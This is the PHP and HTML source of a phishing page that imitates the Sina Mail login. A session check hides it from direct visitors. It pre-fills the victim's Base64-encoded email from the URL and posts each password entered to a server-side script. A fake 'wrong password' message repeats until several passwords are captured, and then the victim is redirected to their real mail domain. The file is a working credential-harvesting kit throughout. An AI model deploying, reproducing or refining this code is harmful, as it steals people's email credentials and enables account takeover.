<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>新浪邮箱</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body>
    <div id="maincsina" style="height: 100vh;">
        <div id="navbsina" class="c-div" style="height: 60px;background: rgba(255,255,255,0.51);padding-top: 13px;padding-bottom: 13px;padding-left: 16px;padding-right: 16px;margin-top: 100px;">
            <div style="max-width: 1420px;width: 100%;"><img class="img-fluid" width="144" height="41" src="../assets/img/sinabg.png"></div>
        </div>
        <div id="m0sina" class="c-div">
            <div id="mainosina" class="c-div" style="height: 502px;width: 100%;">
                <div id="maini139" class="e-div" style="width: 100%;max-width: 1024px;">
                    <div id="fo263" style="width: 100%;max-width: 340px;background: #ffffff;height: fit-content;margin-top: 50px;">
                        <div class="sp-div" style="height: 56px;">
                            <div style="width: 50%;padding: 0px 14px;padding-left: 21px;padding-right: 21px;">
                                <p class="fw-semibold" style="margin-bottom: 0px;margin-top: 20px;color: #22a7d2;"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" style="font-size: 22px;color: var(--bs-warning);margin-bottom: 3px;">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M3.00977 5.83789C3.00977 5.28561 3.45748 4.83789 4.00977 4.83789H20C20.5523 4.83789 21 5.28561 21 5.83789V17.1621C21 18.2667 20.1046 19.1621 19 19.1621H5C3.89543 19.1621 3 18.2667 3 17.1621V6.16211C3 6.11449 3.00333 6.06765 3.00977 6.0218V5.83789ZM5 8.06165V17.1621H19V8.06199L14.1215 12.9405C12.9499 14.1121 11.0504 14.1121 9.87885 12.9405L5 8.06165ZM6.57232 6.80554H17.428L12.7073 11.5263C12.3168 11.9168 11.6836 11.9168 11.2931 11.5263L6.57232 6.80554Z" fill="currentColor"></path>
                                    </svg>&nbsp;免费邮箱登录</p>
                            </div>
                            <div style="width: 50%;background: #ebebeb;padding: 0px 14px;padding-left: 25px;padding-right: 25px;">
                                <p class="fw-semibold" style="margin-bottom: 0px;margin-top: 20px;"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="currentColor" viewBox="0 0 16 16" class="bi bi-star-fill" style="font-size: 18px;color: var(--bs-warning);margin-bottom: 7px;">
                                        <path d="M3.612 15.443c-.386.198-.824-.149-.746-.592l.83-4.73L.173 6.765c-.329-.314-.158-.888.283-.95l4.898-.696L7.538.792c.197-.39.73-.39.927 0l2.184 4.327 4.898.696c.441.062.612.636.282.95l-3.522 3.356.83 4.73c.078.443-.36.79-.746.592L8 13.187l-4.389 2.256z"></path>
                                    </svg>&nbsp;VIP登录</p>
                            </div>
                        </div>
                        <div style="padding: 0px 28px 26px;padding-top: 22px;">
                            <h5>Account Login</h5>
                            <hr><input type="text" id="backEMF" style="width: 100%;height: 40px;padding: 1px 8px;font-size: 14px;margin-top: 8px;"><input type="password" id="pass" class="fw-semibold" style="width: 100%;height: 40px;margin-top: 16px;padding: 1px 8px;font-size: 14px;" placeholder="Password">
                            <p id="err" style="margin-top: 6px;font-size: 14px;color: rgb(242,15,0);margin-bottom: 0px;">密码错误，请重试</p>
                            <div class="sp-div" style="margin-top: 16px;"><button class="btn btn-primary" id="next-btn" type="button" style="width: 40%;height: 40px;border-radius: 0px;background: #22a7d2;border-style: none;" onclick="nextFun();">登录</button><button class="btn btn-primary disabled" type="button" style="width: 40%;height: 40px;border-radius: 0px;background: #ebebeb;color: rgb(24,24,24);border: 1px solid #22a7d2 ;" disabled="">注册</button></div>
                            <div class="e-div" style="margin-top: 16px;font-size: 12px;"></div>
                            <div class="sp-div" style="margin-top: 16px;font-size: 12px;"><a class="fw-semibold" href="#" style="color: rgb(136,170,255);"><strong>微博账号登录</strong></a><a class="fw-semibold" href="#" style="color: rgb(136,170,255);"><strong>更快登录</strong></a></div>
                            <hr>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>